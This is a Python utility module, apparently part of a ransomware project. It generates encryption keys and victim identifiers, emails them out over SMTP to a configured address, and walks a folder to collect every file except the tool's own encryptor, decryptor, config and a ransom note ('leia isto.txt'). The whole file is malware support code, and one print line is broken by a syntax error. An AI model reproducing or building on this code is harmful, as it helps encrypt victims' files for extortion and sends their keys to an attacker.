# utils.py

import uuid
import smtplib
import os
from email.mime.text import MIMEText
from cryptography.fernet import Fernet
from config import EMAIL_ADDRESS, EMAIL_PASSWORD, SMTP_SERVER, SMTP_PORT

IGNORE = {
    "config.py",
    "decryptor.py",
    "encryptor.py",
    "leia isto.txt",
    "utils.py"
}

def generate_key():
    return Fernet.generate_key()

def generate_identifier():
    return str(uuid.uuid4())

def send_email(subject, body):
    msg = MIMEText(body)
    msg['Subject'] = subject
    msg['From'] = EMAIL_ADDRESS
    msg['To'] = EMAIL_ADDRESS

    try:
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as smtp:
            smtp.starttls()
            smtp.login(EMAIL_ADDRESS, EMAIL_PASSWORD)
            smtp.send_message(msg)
    except Exception as e:
        print("errp ao enviar email. ". e)

def list_files(folder):
    list = []
    for root, _, files in os.walk(folder):
        for name in files:
            path = os.path.join(root, name)
            if name not in IGNORE:
                list.append(path)
    return list